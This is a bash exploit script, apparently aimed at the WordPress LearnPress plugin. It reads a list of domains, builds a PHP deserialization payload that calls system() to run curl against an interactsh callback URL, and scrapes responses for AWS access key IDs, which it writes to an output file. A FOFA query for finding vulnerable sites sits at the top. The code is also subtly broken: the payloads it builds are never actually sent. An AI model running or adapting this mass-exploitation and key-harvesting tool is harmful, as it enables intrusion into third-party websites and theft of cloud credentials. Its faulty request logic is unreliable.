#!/bin/bash

# FOFA Query: body="/themes/kingster/learnpress"

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <domains_file> <interactsh_url> <output_file>"
    exit 1
fi

domains_file="$1"
interactsh_url="$2"
output_file="$3"
default_command="grep -oP 'AKIA[A-Z0-9]{16}'"

if [ ! -f "$domains_file" ]; then
    echo "Le fichier de domaines '$domains_file' n'existe pas."
    exit 1
fi

construct_final_url() {
    local interactsh_url="$1"
    local padstr="$2"
    echo "${interactsh_url}${padstr}"
}

exploit() {
    local target_url="$1"
    local interactsh_url="$2"
    local command="$3"
    local output_file="$4"
    local padstr="random_string"

    finalurl=$(construct_final_url "$interactsh_url" "$padstr")

    payload1="GET /wp-json/lp/v1/load_content_via_ajax/?callback={{\"class\": \"LP_Debug\",\"method\": \"var_dump\"}}&args=\"${padstr}\" HTTP/1.1"
    payload2="GET /wp-json/lp/v1/load_content_via_ajax/?callback={{\"class\": \"LP_Helper\",\"method\": \"maybe_unserialize\"}}&args=\"O%3a13%3a%22WP_HTML_Token%22%3a2%3a%7bs%3a13%3a%22bookmark_name%22%3bs%3a64%3a%22curl+${finalurl}%22%3bs%3a10%3a%22on_destroy%22%3bs%3a6%3a%22system%22%3b%7d\" HTTP/1.1"

    host_header=$(echo "$target_url" | sed -e 's|http://||' -e 's|https://||')
    headers="Host: ${host_header}\nConnection: close"

    found_content=""

    for payload in "$payload1" "$payload2"; do
        request_url="${target_url}/wp-json/lp/v1/load_content_via_ajax/"
        
        response=$(curl -s -H "$headers" "$request_url")

        if [ $? -eq 0 ]; then
            found_content+="$response"
        else
            echo "Erreur en envoyant le payload."
        fi
    done

    akia_keys=$(echo "$found_content" | grep -oP 'AKIA[A-Z0-9]{16}')

    if [ -n "$akia_keys" ]; then
        echo "Clés AKIA trouvées dans le contenu."
        echo "Clés AKIA trouvées dans le contenu de $target_url :" >> "$output_file"
        echo "$akia_keys" >> "$output_file"
        echo "Contenu avec les clés AKIA enregistré dans $output_file"
    else
        echo "Aucune clé AKIA trouvée dans le contenu."
    fi
}

test_exploit_on_domains() {
    local domains_file="$1"
    local interactsh_url="$2"
    local output_file="$3"

    while IFS= read -r domain || [ -n "$domain" ]; do
        domain=$(echo "$domain" | tr -d '\r\n')
        exploit "$domain" "$interactsh_url" "$default_command" "$output_file"
    done < "$domains_file"
}

test_exploit_on_domains "$domains_file" "$interactsh_url" "$output_file"
